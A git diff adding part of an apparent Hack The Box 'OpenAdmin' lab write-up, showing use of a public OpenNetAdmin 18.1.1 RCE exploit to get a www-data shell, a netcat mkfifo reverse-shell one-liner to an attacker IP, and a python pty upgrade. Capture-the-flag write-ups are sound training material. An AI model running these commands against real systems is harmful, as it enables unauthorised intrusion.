@@ -56,3 +56,28 @@ These 3 directories are static webpages, but I notice a login page on the`/music
 
 Going to the login page of`/music`shows that it's running OpenNetAdmin, a system for tracking IP network attributes in a database. It turns out that it's running`v18.1.1`which is vulnerable to RCE.
 ![image]({{0xtaylur.github.io}}/assets/openadmin/webpage.png)
+
+Running this [exploit](https://github.com/amriunix/ona-rce) will grant me a shell as user`www-data`.
+```
+root@kali:~/HTB/openadmin# python3 ona-rce.py exploit http://10.10.10.171/ona/
+[*] OpenNetAdmin 18.1.1 - Remote Code Execution
+[+] Connecting !
+[+] Connected Successfully!
+sh$ whoami && id
+www-data
+uid=33(www-data) gid=33(www-data) groups=33(www-data)
+sh$
+```
+
+The current shell won't allow me to traverse through it so I decide to upgrade my shell by starting a netcat listener and using this command on the shell.
+```
+rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.9 1234 >/tmp/f
+```
+
+Once I've caught another shell, I upgrade it once again using python.
+```
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+```
+
+### Lateral Movement
+
